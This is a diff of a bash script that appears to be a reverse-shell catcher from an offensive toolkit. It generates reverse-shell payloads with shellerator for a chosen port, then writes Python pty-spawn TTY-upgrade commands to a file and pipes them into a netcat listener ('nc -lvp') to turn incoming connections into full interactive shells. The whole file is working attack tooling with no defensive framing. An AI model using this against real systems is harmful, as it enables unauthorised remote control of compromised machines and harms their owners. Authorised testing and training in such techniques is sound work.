@@ -1,19 +1,17 @@
 #!/bin/bash
 
 usage (){
-    echo "$0 -p <port to listen> [-i <ip address for reverse shell> ]"
+    echo "$0 -p <port to listen> "
     exit 0
 }
 
-while getopts ":i:p:l:h" option
+while getopts ":p:h" option
 do
         case $option in
-                i)
-                        IP=$OPTARG
-                        ;;
                 p)
                         PORT=$OPTARG
                         ;;
+
                 h)
                         usage
                         ;;
@@ -30,11 +28,8 @@ if [[ -z "$PORT" ]]; then
 fi
 
 python shellerator/shellerator.py -p $PORT
-#if [[ $# != 1 ]]
-#    then
-#    echo "Usage: $0 port"
-#    exit
-#fi
+
+#If error in shellerator do not continue
 if [[ $? != 0 ]]
 then
     exit
@@ -46,12 +41,7 @@ UPDATE_STTY="stty rows $STTY_ROWS cols $STTY_COLS"
 echo "/usr/bin/env python -c 'import pty; pty.spawn([\"bash\",\"-c\",\"$UPDATE_STTY  ; bash\"])'" >> comm.txt
 echo "/usr/bin/env python2.7 -c 'import pty; pty.spawn([\"bash\",\"-c\",\"$UPDATE_STTY  ; bash\"])'" > comm.txt
 echo "/usr/bin/env python3 -c 'import pty; pty.spawn([\"bash\",\"-c\",\"$UPDATE_STTY  ; bash\"])'" >> comm.txt
-#echo "/usr/bin/env python -c 'import pty; pty.spawn(\"/bin/bash\")'" >> comm.txt
-#echo "/usr/bin/env python2.7 -c 'import pty; pty.spawn(\"/bin/bash\")'" > comm.txt
-#echo "/usr/bin/env python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" >> comm.txt
-#echo "/usr/bin/env perl -e 'exec \"/bin/bash\"'" > comm.txt
 
-# echo "script -q /dev/null" > commt.txt # If no python
 stty raw -echo 
 cat comm.txt -| nc -lvp $PORT
 reset
